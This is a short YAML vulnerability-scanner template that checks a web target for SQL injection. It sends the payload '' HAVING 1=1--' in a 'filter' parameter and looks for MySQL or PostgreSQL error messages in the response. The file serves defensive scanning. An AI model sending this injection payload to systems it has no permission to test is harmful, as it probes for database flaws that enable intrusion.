id: sqli3-having-65
name: 'HAVING/GROUP injection in filter'
severity: high
type: active
tags:
  - sqli
  - injection
description: 'Triggers DB error via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - ''' HAVING 1=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'PostgreSQL'
